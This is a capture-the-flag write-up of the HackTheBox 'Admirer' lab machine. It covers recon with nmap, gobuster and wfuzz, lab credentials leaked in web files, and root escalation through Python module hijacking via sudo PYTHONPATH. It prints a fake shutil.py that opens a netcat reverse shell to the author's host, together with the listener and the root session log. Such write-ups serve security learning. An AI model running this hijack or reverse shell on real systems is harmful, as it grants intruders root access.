---
title: "HTB Admirer"
date: 2020-09-21 12:35:00 +0800
categories: [HTB, writeup]
tags: [writeup]
toc: true
---

## Introduction

HTB Admirer is a linux-based box.

Authors: ``polarbearer`` & ``GibParadox``

Machine IP: ``10.10.10.187``

## Reconnaissance

### nmap

As usual with HTB, the first thing to do is to use nmap to scan the box. The IP of the box is ``10.10.10.191``, as you can see in the command I used:

``nmap -sC -sV -o nmap.nmap 10.10.10.187``

Here is the output of the scan: 

```
ali@kali:~/Desktop/htb/admirer$ nmap -sC -sV -o nmap.nmap 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 22:24 EDT
Nmap scan report for 10.10.10.187
Host is up (0.068s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

FTP, SSH, and a web server. 

Let's check out the web server... I noticed nothing on the page initially so I checked common things. Nothing in the source code, but there is something in robots.txt.

```
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Looks like it's pretty clear what to do, we should use gobuster on this directory.



Here's the output:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/09/21 22:46:30 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
===============================================================
2020/09/21 22:51:13 Finished
===============================================================
```

Epic, ``contacts.txt`` and ``credentials.txt`` match up with the message we saw earlier. Let's check those out:

contacts.txt

```
#########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

credentials.txt
```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Remembering the nmap scan, the FTP port is open so let's check that out. We end up getting two files, and one of them is a previous archive of the website.


Of these files, we learn of the ``utility-scripts`` directory. Some of these scripts have credentials in them but unfortunately none of those pages/scripts still exist on the web server. Let's fuzz this directory for more php files.

```
wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/utility-scripts/FUZZ.php --sc 200
```

```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.187/utility-scripts/FUZZ.php
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                              
===================================================================

000001873:   200        51 L     235 W    4156 Ch     "adminer"  
```

Looks like we found something new! We go to the webpage and we are greeted by a login page.

We get the name and the version of this as well: ``Adminer 4.6.2``

After exploiting this version of Adminir with a handly python script, I'm able to dump SSH credentials. Using these, I can log in as user ``waldo`` with the password ``&<h5b~yK3F#{PaPB&dA}{H>`` and get the user flag!

## Priv Escalation

Now that i have logged in as waldo, we do the classic ``sudo -l`` to see what we have permission to access as root.

```
waldo@admirer:/tmp/notouchme$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
waldo@admirer:/tmp/notouchme$ cd /home/waldo
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 

Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Let's check out ``admin_tasks.sh``.

```
waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

One part of this, ``backup_web()``, looks exploitable. Let's look at it closely.

```
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

It appears to be calling a python script. Let's check out the script:

```
waldo@admirer:~$ cat /opt/scripts/backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

It imports the module shutil and calls make_archive from it. 

In Python, modules have "scope" similar to variables. So, we can decalre another "shutil" and "make_archive" function by changing the path the script appears to be run from.

Let's start doing this by going to the /tmp/ directories where we have permission to write files. Let's make a sample ''shutil.py'' with a ''make_archive'' function that will be called.

```
waldo@admirer:/tmp/notouchme$ cat shutil.py
import os
def make_archive(a, b, c):
        os.system('nc 10.10.15.76 9001 -e "/bin/sh"')
```

When we call the shell script and it executes the python script, it will now call our version of make_archive which will interact with the netcat listener I set up on my own machine.

For reference, the command I used on my local machine is ``nc -lnvp 9001``.

Cool, now all that is needed is to trick the python script into running in the directory where we wrote to it. You can see that being done in this command:

```
sudo PYTHONPATH=/tmp/notouchme/ /opt/scripts/admin_tasks.sh
```

After running this, I check the lister I had opened before:

```
kali@kali:~$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.15.76] from (UNKNOWN) [10.10.10.187] 58748
whoami
root
ls
bruh.py
shutil.py
cd /root/
ls
root.txt
cat root.txt
<omit>
```

AND THE BOX IS SOLVED!!! poggers.

## Conclusion

The priv escalation part was made easy because other people had already solved the problem and left behind way too much of a trail to ignore. Because of this, it was very easy to reverse what they had done and figure out what was needed to exploit the box. This is a really poor way of doing things and I will refrain from it in the future. For now, I'm just excited to have another solve, even if I only did like 70% of the exploitation, under my belt.












